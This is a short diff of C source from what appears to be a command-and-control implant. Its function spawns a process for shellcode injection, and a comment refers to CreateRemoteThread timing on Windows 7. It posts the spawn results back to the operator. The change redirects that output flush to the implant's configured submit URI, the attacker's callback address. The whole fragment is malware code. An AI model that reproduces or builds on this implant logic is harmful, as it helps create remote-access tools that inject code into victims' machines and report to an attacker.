@@ -268,7 +268,7 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 		_snprintf(line, sizeof(line), "spawn_x86=%d pid=%u target64=%d\n",
 			(int)x86, (unsigned)pi.dwProcessId, (int)is_x64_process(pi.hProcess));
 		command_shell_post(line, (int)lstrlenA(line), CALLBACK_OUTPUT, FALSE);
-		http_flush_post(post_url);
+		http_flush_post(setting_ptr(SETTING_SUBMITURI));
 	}
 
 	/* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
